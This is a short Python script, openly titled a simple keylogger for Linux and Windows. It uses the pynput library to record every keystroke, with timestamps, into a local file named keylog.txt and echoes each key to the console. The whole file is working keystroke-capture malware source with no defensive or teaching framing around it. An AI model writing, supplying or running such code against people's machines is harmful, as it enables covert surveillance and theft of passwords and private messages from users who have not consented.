#!/usr/bin/env python3
# Simple Keylogger for Linux and Windows

# Cannot detect copy and paste, and any other special information

from pynput.keyboard import Listener, Key
import logging

def on_press(key):
    logging.info(str(key))
    print("{0} pressed".format(key))

def main():
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Program Terminated")
        exit()
